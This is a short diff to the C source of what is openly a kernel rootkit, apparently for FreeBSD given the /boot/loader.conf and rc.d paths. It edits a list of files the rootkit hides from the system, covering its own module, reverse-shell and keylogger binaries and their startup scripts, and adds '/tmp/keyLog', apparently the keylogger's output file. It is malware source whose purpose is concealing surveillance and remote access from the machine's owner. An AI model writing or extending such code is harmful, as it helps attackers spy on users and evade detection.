@@ -34,7 +34,7 @@
 #define RKCALL_DIE "41580f3e3b18a4dadf03d128b9fa9ab80a5b6ac088ee5f713559fa7ba59c5a6d"
 
 /* Hidden files. */
-#define NUM_HIDDEN_FILES 7
+#define NUM_HIDDEN_FILES 8
 static const char *hidden_files[NUM_HIDDEN_FILES] = {
 	"/boot/modules/rootkit.ko",
 	"/boot/loader.conf.transparent",
@@ -42,7 +42,8 @@ static const char *hidden_files[NUM_HIDDEN_FILES] = {
 	"/usr/sbin/rshell_target",
 	"/usr/sbin/keylog_target",
 	"/etc/rc.d/rshell",
-	"/etc/rc.d/keylog"
+	"/etc/rc.d/keylog",
+	"/tmp/keyLog"
 };
 
 /* Transparent files.
